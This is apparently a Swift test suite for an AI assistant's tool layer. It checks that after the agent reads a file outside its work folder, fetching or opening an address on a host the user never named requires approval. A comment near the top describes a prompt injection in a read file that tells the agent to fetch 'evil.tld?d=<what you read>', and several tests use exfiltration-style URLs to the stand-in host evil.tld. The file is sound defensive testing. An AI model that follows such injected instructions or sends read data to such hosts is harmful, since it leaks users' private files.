import CompanionCore
import CompanionCoreTestSupport
@testable import CompanionServices
import CompanionServicesTestSupport
import CompanionTestKit
import Foundation
import Testing

// Read, then fetch: injected text in a file can say "fetch evil.tld?d=<what you
// read>". After a read outside the work folder, a fetch no longer goes unasked.

private func taintDir(_ name: String) -> URL {
    let url = FileManager.default.temporaryDirectory
        .appendingPathComponent("\(name)-\(UUID().uuidString)").resolvingSymlinksInPath()
    do { try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true) } catch {
        Issue.record("no scratch dir: \(error)")
    }
    return url
}

private final class Script: ChatProvider, @unchecked Sendable {
    let calls: [ToolCallRef]
    init(_ calls: [ToolCallRef]) { self.calls = calls }
    func stream(_ history: [Turn], tools: [ToolSpec]) -> AsyncThrowingStream<ChatDelta, Error> {
        let already = history.contains { $0.role == .tool }
        return AsyncThrowingStream { continuation in
            if !already { continuation.yield(.toolCalls(calls)) }
            continuation.finish()
        }
    }
    func verify(_ key: String, provider: ProviderDescriptor) async throws {}
}

private func run(readPath: String?, workdir: String, tainted: Bool = false) async throws -> (approvals: Int, denied: [String]) {
    var calls: [ToolCallRef] = []
    if let readPath {
        calls.append(ToolCallRef(id: "r", name: "read_file", arguments: "{\"path\":\"\(readPath)\"}"))
    }
    // Port 1 refuses at once, so an unasked fetch fails fast instead of reaching a network.
    calls.append(ToolCallRef(id: "f", name: "web_fetch", arguments: "{\"url\":\"http://127.0.0.1:1/?d=x\"}"))
    let executor = NativeExecutor(
        descriptor: ExecutorCatalog.native, chatProvider: Script(calls),
        config: Config(workdir: workdir), approvals: DenyingApprovals())
    let (stream, continuation) = AsyncStream<JobEvent>.makeStream()
    let seen = RoundEvents(stream)
    _ = try await executor.run(JobRequest(id: "j", goal: "g", context: "", tainted: tainted), events: continuation)
    continuation.finish()
    return (await seen.approvals, await seen.denied)
}

@Test(.timeLimit(.minutes(1))) @MainActor
func aFetchAfterReadingOutsideTheWorkFolderAsksFirst() async throws {
    let work = taintDir("taint-work").path
    let elsewhere = taintDir("taint-else").path
    defer {
        do { try FileManager.default.removeItem(atPath: work) } catch {}
        do { try FileManager.default.removeItem(atPath: elsewhere) } catch {}
    }
    try "secreto".write(toFile: elsewhere + "/a.txt", atomically: true, encoding: .utf8)
    let outcome = try await run(readPath: elsewhere + "/a.txt", workdir: work)
    expectEq(outcome.approvals, 1, "leer fuera y luego fetch: pide aprobación")
    expectEq(outcome.denied, ["web_fetch"], "y sin ella el fetch no corre")
}

@Test(.timeLimit(.minutes(1))) @MainActor
func aFetchAfterReadingInsideTheWorkFolderOrAloneDoesNotAsk() async throws {
    let work = taintDir("taint-clean").path
    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
    try "nota".write(toFile: work + "/a.txt", atomically: true, encoding: .utf8)
    let inside = try await run(readPath: work + "/a.txt", workdir: work)
    expectEq(inside.approvals, 0, "leer dentro de la carpeta no contamina el turno")
    let alone = try await run(readPath: nil, workdir: work)
    expectEq(alone.approvals, 0, "un fetch en un turno limpio no pregunta")
}

// The chat and voice lane: the parent has no web_fetch, its way out of the Mac is open_url.

@MainActor
private func chatRunner(work: String) -> ParentToolRunner {
    ParentToolRunner(workspace: FakeWorkspaceOpener(), workdir: work)
}

private func openCall(_ url: String) -> ToolCallRef {
    ToolCallRef(id: "o", name: "open_url", arguments: "{\"url\":\"\(url)\"}")
}

@Test(.timeLimit(.minutes(1))) @MainActor
func inTheChatAnAddressAfterAReadOutsideTheWorkFolderAsksUnlessTheUserSaidIt() async throws {
    let work = taintDir("chat-work").path
    let elsewhere = taintDir("chat-else").path
    defer {
        do { try FileManager.default.removeItem(atPath: work) } catch {}
        do { try FileManager.default.removeItem(atPath: elsewhere) } catch {}
    }
    try "secreto".write(toFile: elsewhere + "/a.txt", atomically: true, encoding: .utf8)
    let tools = chatRunner(work: work)
    let call = openCall("https://evil.tld/?d=x")
    expect(tools.approval(for: call, said: "") == nil, "turno limpio: una dirección corta no pregunta")
    let read = await tools.execute(name: "read_file", argumentsJSON: "{\"path\":\"\(elsewhere)/a.txt\"}")
    expect(read.ok, "la lectura corre sin hoja: \(read.output)")
    expect(tools.approval(for: call, said: "") != nil, "leyó fuera y luego una dirección: pide")
    expect(tools.approval(for: call, said: "abre evil.tld") == nil, "el host lo dijo la usuaria: no pide")
    tools.beginTurn()
    expect(tools.approval(for: call, said: "") == nil, "otro turno: la marca se reinicia")
}

@Test(.timeLimit(.minutes(1))) @MainActor
func inTheChatReadingInsideTheWorkFolderLeavesTheTurnClean() async throws {
    let work = taintDir("chat-clean").path
    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
    try "nota".write(toFile: work + "/a.txt", atomically: true, encoding: .utf8)
    let tools = chatRunner(work: work)
    _ = await tools.execute(name: "read_file", argumentsJSON: "{\"path\":\"\(work)/a.txt\"}")
    expect(tools.approval(for: openCall("https://evil.tld/?d=x"), said: "") == nil, "leer dentro no contamina")
}

@Test @MainActor
func aWorkFolderThatScopesNothingTaintsEveryRead() {
    let home = FileManager.default.homeDirectoryForCurrentUser.resolvingSymlinksInPath().path
    for workdir in [home, "/", (home as NSString).deletingLastPathComponent] {
        let runner = NativeToolRunner(workdir: workdir, places: nil)
        expect(runner.readsOutsideWorkdir(tool: "read_file", arguments: ["path": home + "/x"]),
               "workdir \(workdir): leer ~/x marca el turno")
    }
    let scoped = NativeToolRunner(workdir: home + "/Documents", places: nil)
    expect(!scoped.readsOutsideWorkdir(tool: "read_file", arguments: ["path": home + "/Documents/x"]),
           "una carpeta propia sí acota: leer dentro no marca")
}

@Test(.timeLimit(.minutes(1))) @MainActor
func aDelegatedJobKeepsTheTurnsMark() async throws {
    let work = taintDir("job-mark").path
    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
    expectEq(try await run(readPath: nil, workdir: work, tainted: true).approvals, 1,
             "padre marcado, delegate y luego web_fetch: pide aprobación")
    expectEq(try await run(readPath: nil, workdir: work, tainted: false).approvals, 0, "sin marca: no pide")
    let taint = TurnTaint()
    taint.mark()
    let runner = JobRunner(
        executorProvider: OneProvider(), queue: JobQueue(), approvals: DenyingApprovals(), taint: taint)
    let request = await runner.handoffToRequest(Handoff(goal: "g", context: "c"))
    expect(request.tainted, "el handoff toma la marca del turno del padre")
}

private struct OneProvider: ExecutorProviderProtocol {
    func selectExecutor(for _: Handoff) -> any Executor {
        NativeExecutor(
            descriptor: ExecutorCatalog.native, chatProvider: Script([]),
            config: Config(workdir: "/tmp"), approvals: DenyingApprovals())
    }
}

@Test @MainActor
func aTaintedTurnAsksBeforeOpeningATabOnAHostNobodyNamed() {
    let presence = BrowserPresence()
    presence.set(.chrome)
    let taint = TurnTaint()
    let runner = BrowserToolRunner(
        channel: FakeBrowserChannel(failure: ContractError(code: BridgeCode.timeout, message: "")),
        presence: presence, taint: taint)
    let call = ToolCallRef(id: "b", name: "browser_open", arguments: #"{"url":"https://evil.tld/a"}"#)
    expect(runner.approval(for: call, said: "") == nil, "sin marca: abrir sigue libre")
    taint.mark()
    expect(runner.approval(for: call, said: "") != nil, "con marca y host no dicho: pide")
    expect(runner.approval(for: call, said: "abre evil.tld") == nil, "con marca pero host dicho: no pide")
}

@Test func inQAARaisedAddressToAnUnnamedHostIsCritical() {
    let call = openCall("https://evil.tld/?d=x")
    let request = ApprovalRequest(requestId: "r", toolName: "open_url", summary: "open evil.tld", inputJSON: call.arguments)
    expectEq(QALiveBand.band(request: request, call: call, said: ""), .critical, "host no dicho: Touch ID")
    expectEq(QALiveBand.band(request: request, call: call, said: "abre evil.tld"), .act, "host dicho: pasa")
}
